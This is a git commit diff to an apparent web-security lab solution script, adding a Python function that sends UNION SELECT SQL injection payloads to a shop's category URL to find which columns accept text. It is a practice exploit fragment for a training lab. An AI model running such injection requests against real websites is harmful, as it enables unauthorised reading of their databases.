33ba6b60eec663ee306757ef345ff144c53b49ee
madi <madimirzakup@gmail.com>
2025-01-13 17:46:42 +0500

    #

--- Server Side Topics/SQLi/WTF_SQL injection UNION attack, retrieving data from other tables/payload.py
+++ Server Side Topics/SQLi/WTF_SQL injection UNION attack, retrieving data from other tables/payload.py
@@ -39,12 +39,39 @@ def determine_number_of_columns(url, no_proxy):
     return num_columns
 
 
+def determine_text_columns(url, no_proxy, num_columns):
+    text_columns = []
+    for i in range(0, num_columns):
+        nulls_list = ["NULL"] * num_columns
+        nulls_list[i] = "'a'"
+        nulls = ",".join(nulls_list)
+        category = f"' UNION SELECT {nulls}-- "
+        exploit_url = url + category 
+        if no_proxy: 
+            resp = requests.get(exploit_url)
+        else: 
+            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
+        if resp.status_code == 200:
+            text_columns.append(i)
+    if text_columns:
+        text_columns_str = ", ".join(map(str, text_columns))
+        log.info(f"The text columns are: {text_columns_str}")
+    return text_columns
 
 
 
 def main(args):
     shop = Shop(args.url, args.no_proxy)
     num_columns = determine_number_of_columns(shop.category_url, shop.no_proxy)
+    if not num_columns:
+        log.error("Couldn't determine number of columns. Exiting")
+        sys.exit(-1)
+    
+    
+    
+    
+    
+    
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
